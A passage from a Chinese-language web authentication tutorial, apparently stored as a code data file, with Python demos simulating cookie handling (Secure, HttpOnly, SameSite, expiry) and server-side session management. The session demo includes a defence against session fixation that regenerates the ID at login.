        self.samesite = samesite
        # 创建时间，用于判断是否过期
        self.created_at = time.time()

    def is_expired(self) -> bool:
        """判断 Cookie 是否已过期。"""
        # 如果设了 max_age，按 max_age 判断
        if self.max_age is not None:
            return time.time() > self.created_at + self.max_age
        # 如果设了 expires，按 expires 判断
        if self.expires is not None:
            return time.time() > self.expires
        # 都没设，是会话 Cookie，理论上一关闭浏览器就删
        # 这里模拟时一直保留
        return False

    def to_set_cookie_header(self) -> str:
        """生成 Set-Cookie 响应头的值。

        格式：name=value; Attr1; Attr2=val2; ...
        """
        # 起始：name=value
        parts = [f"{self.name}={self.value}"]

        # 拼接 Domain
        if self.domain:
            parts.append(f"Domain={self.domain}")
        # 拼接 Path
        if self.path:
            parts.append(f"Path={self.path}")
        # 拼接 Max-Age
        if self.max_age is not None:
            parts.append(f"Max-Age={self.max_age}")
        # 拼接 Expires
        if self.expires is not None:
            parts.append(f"Expires={self.expires}")
        # 拼接 HttpOnly
        if self.http_only:
            parts.append("HttpOnly")
        # 拼接 Secure
        if self.secure:
            parts.append("Secure")
        # 拼接 SameSite
        if self.samesite:
            parts.append(f"SameSite={self.samesite}")

        return "; ".join(parts)

    def __repr__(self):
        return f"<Cookie {self.name}={self.value}>"


# ============================================================
# 第二部分：模拟浏览器（Cookie 存储 + 自动带 Cookie）
# ============================================================
class Browser:
    """模拟浏览器，负责保存 Cookie 并在请求时自动带上。

    浏览器的 Cookie 管理逻辑：
    1. 收到 Set-Cookie 响应头时，按 Domain/Path 保存
    2. 发请求时，根据 URL 的域名、路径、协议筛选合适的 Cookie 带上
    """

    def __init__(self):
        # cookie_jar 存所有 Cookie
        self.cookie_jar = []

    def save_cookies(self, set_cookie_headers, request_domain):
        """保存服务端下发的 Cookie。

        参数：
            set_cookie_headers: 服务端返回的 Set-Cookie 头列表
            request_domain: 发请求时用的域名（用于默认 Domain）
        """
        for header in set_cookie_headers:
            # 解析 Set-Cookie 头
            cookie = self._parse_set_cookie(header, request_domain)
            if cookie is None:
                continue

            # 如果已存在同名同域同路径的 Cookie，先删掉（覆盖）
            self.cookie_jar = [
                c for c in self.cookie_jar
                if not (c.name == cookie.name and
                        c.domain == cookie.domain and
                        c.path == cookie.path)
            ]
            # 加入新 Cookie
            self.cookie_jar.append(cookie)
            print(f"  [浏览器] 保存 Cookie: {cookie.name}={cookie.value}")

    def _parse_set_cookie(self, header, default_domain):
        """解析 Set-Cookie 头，返回 Cookie 对象。"""
        # 按 "; " 分割
        parts = header.split("; ")
        # 第一段是 name=value
        name, value = parts[0].split("=", 1)

        # 解析其余属性
        domain = default_domain
        path = "/"
        max_age = None
        expires = None
        http_only = False
        secure = False
        samesite = "Lax"

        for part in parts[1:]:
            if "=" in part:
                k, v = part.split("=", 1)
                k = k.strip()
                if k == "Domain":
                    domain = v
                elif k == "Path":
                    path = v
                elif k == "Max-Age":
                    max_age = int(v)
                elif k == "Expires":
                    expires = v  # 简化，真实要解析时间
                elif k == "SameSite":
                    samesite = v
            else:
                # 没等号的属性
                if part == "HttpOnly":
                    http_only = True
                elif part == "Secure":
                    secure = True

        return Cookie(name, value, domain, path, max_age, expires,
                      http_only, secure, samesite)

    def get_cookie_header(self, url_domain, url_path, is_https,
                          is_cross_site=False, top_level_nav=False):
        """根据请求 URL 筛选要带上的 Cookie，拼接成 Cookie 请求头。

        筛选规则：
        1. Domain 必须匹配（请求域名是 Cookie 域名或其子域）
        2. Path 必须匹配（请求路径以 Cookie 路径开头）
        3. Secure 的 Cookie 只在 HTTPS 下带
        4. SameSite 策略控制跨站是否带
        5. 过期的 Cookie 不带
        """
        cookies_to_send = []

        for cookie in self.cookie_jar:
            # 检查过期
            if cookie.is_expired():
                continue

            # 检查 Domain 匹配
            # 请求域名必须是 Cookie 域名，或者是其子域名
            if cookie.domain and not (
                url_domain == cookie.domain or
                url_domain.endswith("." + cookie.domain)
            ):
                continue

            # 检查 Path 匹配
            # 请求路径必须以 Cookie 路径开头
            if not url_path.startswith(cookie.path):
                continue

            # 检查 Secure
            # 标记了 Secure 的 Cookie 只在 HTTPS 下发送
            if cookie.secure and not is_https:
                continue

            # 检查 SameSite
            # is_cross_site=True 表示这是跨站请求（从别的网站点过来）
            if is_cross_site:
                if cookie.samesite == "Strict":
                    # Strict: 跨站完全不带
                    continue
                elif cookie.samesite == "Lax":
                    # Lax: 仅顶层导航的 GET 带其他不带
                    if not top_level_nav:
                        continue
                elif cookie.samesite == "None":
                    # None: 都带（必须配 Secure）
                    pass

            cookies_to_send.append(cookie)

        if not cookies_to_send:
            return None

        # 拼接成 "name1=value1; name2=value2" 格式
        return "; ".join(f"{c.name}={c.value}" for c in cookies_to_send)

    def print_cookie_jar(self):
        """打印当前所有 Cookie，方便调试。"""
        print("  [浏览器] 当前 Cookie 列表：")
        for c in self.cookie_jar:
            extra = []
            if c.http_only:
                extra.append("HttpOnly")
            if c.secure:
                extra.append("Secure")
            if c.samesite:
                extra.append(f"SameSite={c.samesite}")
            extra_str = " ".join(extra) if extra else "-"
            print(f"    {c.name}={c.value}  Domain={c.domain}  "
                  f"Path={c.path}  [{extra_str}]")


# ============================================================
# 第三部分：模拟服务端
# ============================================================
class Server:
    """模拟服务端，可以下发 Cookie 和接收带 Cookie 的请求。"""

    def __init__(self, domain):
        self.domain = domain

    def login_response(self):
        """模拟登录响应，下发 session_id Cookie。

        这里设置完整的安全属性：
        - HttpOnly: 防 XSS
        - Secure: 仅 HTTPS
        - SameSite=Lax: 防 CSRF
        - Max-Age=3600: 1 小时过期
        """
        # 构造一个安全的登录 Cookie
        cookie = Cookie(
            name="session_id",
            value="abc123secret",
            domain=self.domain,
            path="/",
            max_age=3600,
            http_only=True,
            secure=True,
            samesite="Lax",
        )
        # 返回 Set-Cookie 头
        return [cookie.to_set_cookie_header()]

    def theme_response(self):
        """模拟主题设置响应，下发非敏感的 theme Cookie。

        非敏感 Cookie 不需要 HttpOnly（前端 JS 要读），
        不需要 Secure（HTTP 也行）。
        """
        cookie = Cookie(
            name="theme",
            value="dark",
            domain=self.domain,
            path="/",
            max_age=86400,  # 1 天
            http_only=False,
            secure=False,
            samesite="Lax",
        )
        return [cookie.to_set_cookie_header()]

    def handle_request(self, cookie_header, path):
        """处理请求，读取 Cookie。"""
        print(f"  [服务端] 收到请求 path={path}")
        if cookie_header:
            print(f"  [服务端] 读取到 Cookie: {cookie_header}")
            # 解析 Cookie
            cookies = {}
            for pair in cookie_header.split("; "):
                k, v = pair.split("=", 1)
                cookies[k] = v
            if "session_id" in cookies:
                print(f"  [服务端] 识别用户 session_id={cookies['session_id']}")
                return {"status": 200, "user": "zhangsan"}
            else:
                print("  [服务端] 没有登录 Cookie，未登录")
                return {"status": 401}
        else:
            print("  [服务端] 没有任何 Cookie")
            return {"status": 401}


# ============================================================
# 第四部分：运行演示
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("第二章 demo：Cookie 的设置和读取过程模拟")
    print("=" * 60)

    # 创建浏览器和服务端
    browser = Browser()
    server = Server("example.com")

    # ---- 场景 1：登录，服务端下发 session_id Cookie ----
    print("\\n--- 场景 1：登录，服务端下发 Cookie ---")
    set_cookie_headers = server.login_response()
    for h in set_cookie_headers:
        print(f"  [服务端] Set-Cookie: {h}")
    browser.save_cookies(set_cookie_headers, "example.com")
    browser.print_cookie_jar()

    # ---- 场景 2：同站 HTTPS 请求，应该自动带 Cookie ----
    print("\\n--- 场景 2：同站 HTTPS 请求，自动带 Cookie ---")
    cookie_header = browser.get_cookie_header(
        url_domain="example.com",
        url_path="/profile",
        is_https=True,
        is_cross_site=False,
    )
    print(f"  [浏览器] 发送 Cookie: {cookie_header}")
    server.handle_request(cookie_header, "/profile")

    # ---- 场景 3：HTTP 请求，Secure Cookie 不应带 ----
    print("\\n--- 场景 3：HTTP 请求，Secure Cookie 不带 ---")
    cookie_header = browser.get_cookie_header(
        url_domain="example.com",
        url_path="/profile",
        is_https=False,
        is_cross_site=False,
    )
    print(f"  [浏览器] 发送 Cookie: {cookie_header}")
    server.handle_request(cookie_header, "/profile")

    # ---- 场景 4：跨站请求（如从 evil.com 点链接过来）----
    print("\\n--- 场景 4：跨站请求，SameSite=Lax 的 Cookie 限制 ---")
    # 顶层导航 GET（如点击链接）应该带
    cookie_header = browser.get_cookie_header(
        url_domain="example.com",
        url_path="/profile",
        is_https=True,
        is_cross_site=True,
        top_level_nav=True,
    )
    print(f"  [浏览器] 顶层导航 GET 带 Cookie: {cookie_header}")

    # 跨站 POST（如表单提交）不带（防 CSRF）
    cookie_header = browser.get_cookie_header(
        url_domain="example.com",
        url_path="/transfer",
        is_https=True,
        is_cross_site=True,
        top_level_nav=False,
    )
    print(f"  [浏览器] 跨站 POST 不带 Cookie: {cookie_header}")

    # ---- 场景 5：设置主题 Cookie（非敏感）----
    print("\\n--- 场景 5：设置非敏感 theme Cookie ---")
    theme_headers = server.theme_response()
    for h in theme_headers:
        print(f"  [服务端] Set-Cookie: {h}")
    browser.save_cookies(theme_headers, "example.com")
    browser.print_cookie_jar()

    # ---- 场景 6：HTTP 请求，theme Cookie（非 Secure）应该带 ----
    print("\\n--- 场景 6：HTTP 请求，theme Cookie 应该带（非 Secure）---")
    cookie_header = browser.get_cookie_header(
        url_domain="example.com",
        url_path="/",
        is_https=False,
        is_cross_site=False,
    )
    print(f"  [浏览器] 发送 Cookie: {cookie_header}")

    # ---- 场景 7：演示 Cookie 过期 ----
    print("\\n--- 场景 7：手动让 Cookie 过期 ---")
    # 把 session_id 的 max_age 改成 1 秒，等 2 秒
    for c in browser.cookie_jar:
        if c.name == "session_id":
            c.max_age = 1
    print("  等待 2 秒让 Cookie 过期...")
    time.sleep(2)
    cookie_header = browser.get_cookie_header(
        url_domain="example.com",
        url_path="/profile",
        is_https=True,
        is_cross_site=False,
    )
    print(f"  [浏览器] 过期后发送 Cookie: {cookie_header}")

    # ---- 场景 8：HttpOnly 的意义（JS 能否读取）----
    print("\\n--- 场景 8：HttpOnly 属性的意义 ---")
    for c in browser.cookie_jar:
        if c.http_only:
            print(f"  Cookie {c.name}: HttpOnly=True，"
                  f"JS 通过 document.cookie 读不到（防 XSS）")
        else:
            print(f"  Cookie {c.name}: HttpOnly=False，"
                  f"JS 可以读（用于前端需要用的偏好设置）")

    print("\\n" + "=" * 60)
    print("总结：")
    print("  1. HTTP 无状态，Cookie 是给 HTTP 打的'记忆补丁'")
    print("  2. 敏感 Cookie 一定要：HttpOnly + Secure + SameSite")
    print("  3. Secure 防窃听，HttpOnly 防 XSS，SameSite 防 CSRF")
    print("  4. 非敏感偏好 Cookie 可以让 JS 读，不用 HttpOnly")
    print("=" * 60)
`,
  },

  // ============================================================
  // 第 3 章：Session 机制：服务端状态管理
  // ============================================================
  {
    id: "fa-session-mechanism",
    group: "第一部分 认证基础原理",
    icon: "📦",
    title: "Session 机制：服务端状态管理",
    content: `# Session 机制：服务端状态管理

## 一、从衣帽牌说起

你去看演出，把外套存进衣帽间：

1. 服务员把你的外套挂好，递给你一个**号码牌**。
2. 你只需保管这个号码牌（轻便、不贵重）。
3. 演出结束，你拿号码牌给服务员，服务员凭牌找到你的外套还给你。
4. 如果牌丢了，别人捡到也未必能取——服务员可能要看你身份证。

这个场景就是 Session 机制的完美类比：

- **外套** = 用户状态（登录信息、购物车等），存在服务端
- **号码牌** = Session ID，发给客户端
- **服务员凭牌找外套** = 服务端根据 Session ID 查找对应的状态

## 二、Session 的工作原理

### 2.1 核心思想

Session 的核心思想是：**状态存在服务端，客户端只持有一个不透明的 ID**。

为什么不直接把状态存在客户端？因为：

1. **安全**：客户端可篡改数据。如果存"role=admin"，用户改成"role=admin"就提权了。
2. **隐私**：状态可能含敏感信息，不应暴露给客户端。
3. **大小**：Cookie 有大小限制（约 4KB），状态可能很大。

服务端存状态，客户端只存一个 ID——既安全又轻便。

### 2.2 完整流程

\`\`\`
客户端                           服务端
  |                                |
  |  POST /login (用户名密码)      |
  | -----------------------------> |
  |                                |  校验通过
  |                                |  生成 Session ID = abc123
  |                                |  存 Session[abc123] = {user: 张三, ...}
  |                                |
  |  200 OK                        |
  |  Set-Cookie: session_id=abc123; HttpOnly
  | <----------------------------- |
  |                                |
  |  浏览器保存 Cookie             |
  |                                |
  |  GET /profile                  |
  |  Cookie: session_id=abc123     |
  | -----------------------------> |
  |                                |  读 Cookie 拿 session_id
  |                                |  查 Session[abc123] -> 找到用户
  |                                |
  |  200 OK (张三的数据)           |
  | <----------------------------- |
\`\`\`

关键点：

1. Session ID 是服务端生成的**随机字符串**，无法预测。
2. Session ID 通过 Cookie 传给客户端（也可以用 URL 参数，但不推荐）。
3. 服务端用一个**字典**（或数据库）存 Session ID 到状态的映射。
4. 客户端每次请求带上 Session ID，服务端查字典即可。

### 2.3 Session ID 的安全要求

Session ID 是访问用户状态的钥匙，必须满足：

- **足够长**：至少 128 位随机（防暴力猜解）
- **真随机**：用密码学安全随机数（\`secrets\` 模块，不是 \`random\`）
- **不可预测**：不能用自增 ID（攻击者能枚举）
- **唯一**：不同用户不同 ID

如果 Session ID 可预测，攻击者就能伪造 ID 冒充其他用户——这叫**Session 固定攻击**或**会话劫持**。

## 三、Session 的存储方式

服务端用什么东西存 Session？这是 Session 机制的关键选择。常见四种：

### 3.1 内存存储

把 Session 存在进程内存里（一个 Python 字典）。

优点：

- 速度最快（无网络/磁盘开销）
- 实现最简单

缺点：

- **重启就丢**：服务端进程崩溃，所有 Session 没了，用户全被踢下线
- **不能水平扩展**：用户登录到服务器 A，下次请求到服务器 B，B 没有这个 Session
- **内存有限**：用户多了撑不住

适用：**单机开发**、小型 Demo。生产环境绝不能用。

### 3.2 文件存储

把 Session 序列化后存到文件系统。

优点：

- 实现简单
- 重启不丢（持久化）

缺点：

- **多服务器不共享**：每台服务器的文件系统是独立的
- **IO 较慢**：每次请求都要读写文件
- **并发差**：文件锁机制粗糙

适用：单机小站点。生产很少用。

### 3.3 Redis / Memcached 存储

把 Session 存到分布式缓存里。

优点：

- **快**：内存级速度
- **共享**：多台服务器都连同一个 Redis，Session 自动共享
- **内置过期**：Redis 的 TTL 机制天然适合 Session 过期
- **可扩展**：Redis 集群可水平扩展

缺点：

- 多一次网络往返
- 需要运维 Redis

适用：**生产环境主流方案**。中小型到大型应用都适合。

### 3.4 数据库存储

把 Session 存到 MySQL、PostgreSQL 等数据库。

优点：

- 强持久化
- 适合需要审计的场景

缺点：

- **慢**：数据库 IO 比 Redis 慢得多
- 压力大：每个请求都查库

适用：对持久化要求极高的场景（如金融）。通常配合缓存用。

### 3.5 对比表

| 方式 | 速度 | 持久化 | 多服务器共享 | 适用 |
|------|------|--------|-------------|------|
| 内存 | 极快 | 否 | 否 | 开发 |
| 文件 | 中 | 是 | 否 | 小站点 |
| Redis | 快 | 是（可选）| 是 | 主流 |
| 数据库 | 慢 | 是 | 是 | 强持久化场景 |

## 四、Session vs Cookie 的对比

很多人混淆 Session 和 Cookie，因为它们经常一起出现。但它们是不同层面的东西：

| 维度 | Cookie | Session |
|------|--------|---------|
| 存储位置 | 客户端（浏览器）| 服务端 |
| 大小限制 | ~4KB | 无限制（受存储介质）|
| 安全性 | 低（可篡改）| 高（用户看不到内容）|
| 生命周期 | 可设过期 | 服务端控制 |
| 关系 | Session ID 通常通过 Cookie 传递 | Session 依赖 Cookie 传 ID |

**正确理解**：Cookie 和 Session 不是对立关系，而是**协作关系**。Session 是机制，Cookie 是传递 Session ID 的常见载体。

类比：

- Cookie = 你身上的号码牌
- Session = 衣帽间里挂着的衣服
- 衣服不会跟着你到处走（状态在服务端），你只拿牌（Cookie 传 ID）

## 五、Session 的过期与销毁

### 5.1 为什么要过期

如果 Session 永不过期：

- **安全隐患**：Session ID 泄露后永久有效
- **资源占用**：服务端堆积大量不活跃 Session

所以 Session 必须有过期机制。

### 5.2 两类过期

#### 绝对过期

从创建开始计时，到点必过期。比如"登录后 7 天必须重新登录"。

\`\`\`python
# 创建时记录 expires_at
session["created_at"] = now()
session["expires_at"] = now() + 7 * 86400  # 7 天
\`\`\`

#### 闲置过期

只要用户活跃就续期，闲置一段时间才过期。比如"30 分钟不操作就掉线"。

\`\`\`python
# 每次访问更新 expires_at
session["last_access"] = now()
session["expires_at"] = now() + 1800  # 30 分钟
\`\`\`

银行常用闲置过期（30 分钟无操作就退出），论坛常用绝对过期（30 天自动登录）。

### 5.3 主动销毁

用户点"退出登录"时，服务端要：

1. 把 Session 从存储里删除
2. 让客户端浏览器删除 Session ID Cookie

\`\`\`python
def logout(request):
    session_id = request.cookies.get("session_id")
    if session_id in session_store:
        del session_store[session_id]  # 删服务端 Session
    response.delete_cookie("session_id")  # 删客户端 Cookie
\`\`\`

### 5.4 滑动过期 vs 固定过期

- **固定过期**：登录时设好 expires_at，之后不变。
- **滑动过期**：每次访问都把 expires_at 往后推。

滑动过期对用户体验更好（活跃用户不掉线），但实现稍复杂。Redis 的 TTL 配合 \`EXPIRE\` 命令很容易实现滑动过期。

## 六、Session 的安全威胁

### 6.1 会话劫持

攻击者偷到用户的 Session ID，冒充用户访问。

防御：

- **HTTPS**：防止 ID 在网络传输中被窃听
- **HttpOnly Cookie**：防止 JS 偷 Cookie
- **定期更换 ID**：登录后立即换 ID（防固定攻击）
- **IP / UA 绑定**：检测 IP 或 User-Agent 突变（有副作用，慎用）

### 6.2 会话固定

攻击者诱骗用户用攻击者指定的 Session ID 登录（如通过 URL 传 ID），登录后攻击者也用这个 ID 冒充用户。

防御：**登录成功后必须重新生成 Session ID**，把旧 ID 失效。

\`\`\`python
def login(username, password):
    if verify(username, password):
        # 关键：登录后重新生成 ID
        new_session_id = generate_session_id()
        session_store[new_session_id] = {"user": username}
        # 删除旧 ID（如果存在）
        old_id = request.cookies.get("session_id")
        if old_id in session_store:
            del session_store[old_id]
\`\`\`

### 6.3 CSRF

Session 通过 Cookie 传 ID，跨站请求会自动带 Cookie，导致 CSRF 风险。

防御：用 \`SameSite=Lax\` 或 CSRF Token（上一章已讲）。

## 七、分布式 Session 的挑战

### 7.1 问题

单机 Session 存内存就行。但生产环境通常多台服务器，问题来了：

用户第一次请求到服务器 A，A 的内存里创建了 Session。第二次请求被负载均衡到服务器 B，B 的内存里没有这个 Session——用户被踢下线。

### 7.2 解决方案

#### 方案 1：粘性会话（Sticky Session）

负载均衡器把同一用户的请求始终路由到同一台服务器。

缺点：服务器宕机，那台机器上的用户全掉线；扩容时负载不均。

#### 方案 2：Session 复制

服务器之间同步 Session（如 Tomcat 的集群 Session 复制）。

缺点：同步开销大，不适合大规模集群。

#### 方案 3：集中存储（推荐）

所有服务器连同一个 Redis，Session 存 Redis。任何服务器都能读写。

\`\`\`
服务器 A、B、C --> Redis（存所有 Session）
\`\`\`

这是生产环境的主流方案。Redis 提供速度、共享、过期机制，几乎是为 Session 量身定做。

#### 方案 4：无状态（JWT）

干脆不用 Session，改用 JWT——状态存客户端，服务端不存。这是另一条路线，下一章会讲。

## 八、在 FastAPI 里用 Session

FastAPI 本身不内置 Session（不像 Flask），但可以自己实现，或用 \`starlette\` 的 \`SessionMiddleware\`：

\`\`\`python
from fastapi import FastAPI, Request, Response
from starlette.middleware.sessions import SessionMiddleware

app = FastAPI()
# 加 Session 中间件，secret_key 用于签名 Cookie（防篡改）
app.add_middleware(SessionMiddleware, secret_key="your-secret-key")

@app.post("/login")
def login(request: Request):
    # Session 数据存在 request.session 里
    request.session["user"] = "zhangsan"
    return {"message": "登录成功"}

@app.get("/profile")
def profile(request: Request):
    user = request.session.get("user")
    if user is None:
        return {"error": "未登录"}
    return {"user": user}

@app.post("/logout")
def logout(request: Request, response: Response):
    # 清空 Session
    request.session.clear()
    return {"message": "已退出"}
\`\`\`

注意 \`SessionMiddleware\` 把 Session 数据**签名后存在 Cookie 里**（不是服务端存储），适合小型应用。大型应用建议自己实现 Redis Session。

## 九、本章小结

| 概念 | 一句话 |
|------|-------|
| Session | 服务端存状态，客户端持 ID |
| Session ID | 访问状态的钥匙，必须随机不可预测 |
| 存储 | 内存/文件/Redis/数据库，生产用 Redis |
| 过期 | 绝对过期 vs 闲置过期 |
| 会话固定防御 | 登录后重新生成 ID |
| 分布式 Session | 集中存储（Redis）或无状态（JWT）|

## 十、本章 demo 说明

下面的 demo 用纯 Python 实现一个简版 Session 管理系统：

- 内存存储 + 模拟 Redis 存储（两种实现对比）
- Session 的创建、读取、续期、销毁
- 演示会话固定攻击的防御
- 演示滑动过期机制`,
    code: `"""
第三章 demo：简版 Session 管理（内存 + 模拟 Redis）
目标：用纯 Python 实现一个完整的 Session 管理，演示：
  1. Session 的创建、读取、续期、销毁
  2. 内存存储 vs 模拟 Redis 存储（多服务器共享）
  3. 会话固定攻击的防御（登录后换 ID）
  4. 滑动过期机制
说明：本 demo 不依赖第三方库，模拟 Redis 行为帮助理解分布式 Session
"""
import secrets
import time
import json


# ============================================================
# 第一部分：Session 存储后端（可插拔设计）
# ============================================================
class MemorySessionStore:
    """内存存储后端。

    特点：
    - 速度极快
    - 重启就丢
    - 不能多服务器共享

    适合：开发环境、单机小应用
    """

    def __init__(self):
        # 用字典存所有 Session
        # 结构：{ session_id: {数据} }
        self._store = {}

    def set(self, session_id, data, ttl=None):
        """保存 Session。

        参数：
            session_id: Session ID
            data: Session 数据（字典）
            ttl: 存活秒数（None 表示不过期）
        """
        # 把过期时间也存进去
        record = {
            "data": data,
            "expires_at": time.time() + ttl if ttl else None,
        }
        self._store[session_id] = record

    def get(self, session_id):
        """读取 Session，过期则返回 None 并删除。"""
        record = self._store.get(session_id)
        if record is None:
            return None
        # 检查过期
        if record["expires_at"] and time.time() > record["expires_at"]:
            # 过期了，删掉
            del self._store[session_id]
            return None
        return record["data"]

    def touch(self, session_id, ttl=None):
        """续期：更新过期时间（滑动过期）。"""
        record = self._store.get(session_id)
        if record is None:
            return False
        if ttl:
            record["expires_at"] = time.time() + ttl
        return True

    def delete(self, session_id):
        """删除 Session。"""
        if session_id in self._store:
            del self._store[session_id]
            return True
        return False

    def size(self):
        """返回当前 Session 数量。"""
        return len(self._store)


class RedisSessionStore:
    """模拟 Redis 存储后端。

    特点：
    - 多服务器可共享（所有服务器连同一个 Redis）
    - 内置 TTL 过期
    - 内存级速度

    说明：真实场景会用 redis-py 库连接 Redis 服务器，
          这里用一个全局对象模拟其行为。
    """

    def __init__(self):
        # 模拟 Redis 的内存存储
        self._store = {}

    def set(self, session_id, data, ttl=None):
        """SET key value [EX ttl]。"""
        # 模拟 Redis：序列化为 JSON 存储
        record = {
            "data": data,
            "expires_at": time.time() + ttl if ttl else None,
        }
        self._store[session_id] = json.dumps(record)

    def get(self, session_id):
        """GET key。"""
        raw = self._store.get(session_id)
        if raw is None:
            return None
        record = json.loads(raw)
        # 模拟 Redis 的 TTL 检查
        if record["expires_at"] and time.time() > record["expires_at"]:
            del self._store[session_id]
            return None
        return record["data"]

    def touch(self, session_id, ttl=None):
        """EXPIRE key ttl（续期）。"""
        raw = self._store.get(session_id)
        if raw is None:
            return False
        record = json.loads(raw)
        if ttl:
            record["expires_at"] = time.time() + ttl
            self._store[session_id] = json.dumps(record)
        return True

    def delete(self, session_id):
        """DEL key。"""
        if session_id in self._store:
            del self._store[session_id]
            return True
        return False

    def size(self):
        return len(self._store)


# ============================================================
# 第二部分：Session 管理器
# ============================================================
class SessionManager:
    """Session 管理器，封装 Session 的所有操作。

    职责：
    - 生成安全的 Session ID
    - 创建 / 读取 / 续期 / 销毁 Session
    - 防御会话固定攻击（登录后换 ID）
    """

    def __init__(self, store, default_ttl=1800, sliding=True):
        """
        参数：
            store: 存储后端（MemorySessionStore 或 RedisSessionStore）
            default_ttl: 默认过期秒数（默认 30 分钟）
            sliding: 是否启用滑动过期（True=每次访问续期）
        """
        self.store = store
        self.default_ttl = default_ttl
        self.sliding = sliding

    def _generate_session_id(self):
        """生成安全的 Session ID。

        关键点：
        - 用 secrets.token_urlsafe（密码学安全随机）
        - 不用 random（伪随机，可预测）
        - 长度足够（32 字节 -> 43 字符）
        """
        return secrets.token_urlsafe(32)

    def create_session(self, data):
        """创建新 Session。

        流程：
        1. 生成随机 Session ID
        2. 把数据存到后端
        3. 返回 Session ID 给调用方（最终通过 Cookie 给客户端）
        """
        session_id = self._generate_session_id()
        # 加上创建时间，方便审计
        data = {
            **data,
            "created_at": time.time(),
        }
        self.store.set(session_id, data, ttl=self.default_ttl)
        return session_id

    def get_session(self, session_id):
        """读取 Session，如果开启滑动过期则续期。"""
        data = self.store.get(session_id)
        if data is None:
            return None
        # 滑动过期：每次访问都续期
        if self.sliding:
            self.store.touch(session_id, ttl=self.default_ttl)
        return data

    def destroy_session(self, session_id):
        """销毁 Session（用户登出时调用）。"""
        return self.store.delete(session_id)

    def regenerate_session_id(self, old_session_id, data=None):
        """重新生成 Session ID（防会话固定攻击）。

        场景：用户登录成功后，立即把旧 ID 失效，发一个新 ID。
        这样攻击者即使之前固定了一个 ID，登录后也会失效。

        参数：
            old_session_id: 旧的 Session ID
            data: 新 Session 的数据（通常包含登录用户信息）
        返回：
            新的 Session ID
        """
        # 如果没传 data，从旧 Session 里取
        if data is None:
            data = self.store.get(old_session_id) or {}

        # 删掉旧 ID
        self.store.delete(old_session_id)

        # 创建新 ID
        new_id = self.create_session(data)
        return new_id


# ============================================================
# 第三部分：模拟一个完整的登录流程
# ============================================================
class AuthService:
    """模拟认证服务，演示 Session 在登录流程中的使用。"""

    def __init__(self, session_manager):
        self.session_manager = session_manager
        # 模拟用户数据库
        self.users = {
            "zhangsan": "pass123",
            "adminlee": "admin456",
        }

    def login(self, username, password, old_session_id=None):
        """登录流程。

        关键防御：
        - 登录成功后必须重新生成 Session ID（防会话固定）
        - 即使 old_session_id 存在，也要换成新的
        """
        # 校验密码
        if self.users.get(username) != password:
            return {"success": False, "code": 401,
                    "message": "用户名或密码错误"}

        # 登录成功，重新生成 Session ID
        # 这一步是防会话固定攻击的关键
        new_session_id = self.session_manager.regenerate_session_id(
            old_session_id or "",
            data={
                "username": username,
                "login_at": time.time(),
            },
        )

        return {
            "success": True,
            "session_id": new_session_id,
            "message": f"{username} 登录成功",
        }

    def get_current_user(self, session_id):
        """根据 Session ID 获取当前登录用户。"""
        data = self.session_manager.get_session(session_id)
        if data is None:
            return None
        return data.get("username")

    def logout(self, session_id):
        """登出，销毁 Session。"""
        if self.session_manager.destroy_session(session_id):
            return {"success": True, "message": "已退出登录"}
        return {"success": False, "message": "Session 不存在"}


# ============================================================
# 第四部分：运行演示
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("第三章 demo：简版 Session 管理")
    print("=" * 60)

    # ---- 场景 1：内存存储 + 单服务器 ----
    print("\\n--- 场景 1：内存存储，登录 -> 访问 -> 退出 ---")
    mem_store = MemorySessionStore()
    manager1 = SessionManager(mem_store, default_ttl=1800, sliding=True)
    auth1 = AuthService(manager1)

    # 登录
    login_result = auth1.login("zhangsan", "pass123")
    print(f"登录结果：{login_result}")
    sid = login_result["session_id"]
    print(f"Session ID: {sid[:20]}...")

    # 访问受保护资源
    user = auth1.get_current_user(sid)
    print(f"当前用户：{user}")

    # 退出
    print(auth1.logout(sid))
    # 退出后再访问
    user = auth1.get_current_user(sid)
    print(f"退出后访问：{user}")

    # ---- 场景 2：模拟会话固定攻击的防御 ----
    print("\\n--- 场景 2：会话固定攻击防御 ---")
    # 攻击者先让用户用一个"攻击者知道的" Session ID
    attacker_known_id = "attacker-fixed-id-12345"
    # 攻击者把这个 ID 写进用户浏览器 Cookie（通过钓鱼链接等）
    manager1.store.set(attacker_known_id,
                       {"bait": "攻击者放的诱饵"}, ttl=3600)
    print(f"攻击者固定的 ID: {attacker_known_id}")

    # 用户带着这个 ID 去登录
    login_result = auth1.login("zhangsan", "pass123",
                               old_session_id=attacker_known_id)
    new_sid = login_result["session_id"]
    print(f"登录后新 Session ID: {new_sid[:20]}...")
    print(f"新 ID 与攻击者固定的 ID 不同：{new_sid != attacker_known_id}")

    # 攻击者用旧 ID 访问（应该失败，因为已被销毁）
    user = auth1.get_current_user(attacker_known_id)
    print(f"攻击者用旧 ID 访问：{user}（应该为 None，攻击失败）")

    # ---- 场景 3：模拟 Redis 存储，多服务器共享 ----
    print("\\n--- 场景 3：Redis 存储，多服务器共享 ---")
    # 共享同一个 Redis（这里用同一个对象模拟）
    shared_redis = RedisSessionStore()

    # 服务器 A 和服务器 B 都连这个 Redis
    server_a_manager = SessionManager(shared_redis, default_ttl=1800)
    server_b_manager = SessionManager(shared_redis, default_ttl=1800)

    # 用户在服务器 A 登录
    print("用户在服务器 A 登录...")
    sid_a = server_a_manager.create_session({"username": "zhangsan"})
    print(f"服务器 A 创建 Session ID: {sid_a[:20]}...")

    # 用户请求被负载均衡到服务器 B
    print("用户请求被路由到服务器 B...")
    data = server_b_manager.get_session(sid_a)
    print(f"服务器 B 读取 Session: {data}")
    print("-> 多服务器共享成功！")

    # ---- 场景 4：滑动过期 vs 固定过期 ----
    print("\\n--- 场景 4：滑动过期 vs 固定过期 ---")
    # 滑动过期
    sliding_store = MemorySessionStore()
    sliding_manager = SessionManager(sliding_store,
                                     default_ttl=2,  # 2 秒过期，方便测试
                                     sliding=True)
    sid = sliding_manager.create_session({"user": "test"})
    print(f"创建 Session，TTL=2 秒，开启滑动过期")

    # 立即访问
    print(f"  0 秒访问: {sliding_manager.get_session(sid) is not None}")
    # 等 1 秒
    time.sleep(1)
    print(f"  1 秒访问: {sliding_manager.get_session(sid) is not None} "
          f"（续期了，重新计时 2 秒）")
    # 再等 1 秒（如果没续期就过期了，但续期了所以还在）
    time.sleep(1)
    print(f"  2 秒访问: {sliding_manager.get_session(sid) is not None} "
          f"（因为 1 秒时访问过续期了，所以还在）")

    # 固定过期
    fixed_store = MemorySessionStore()
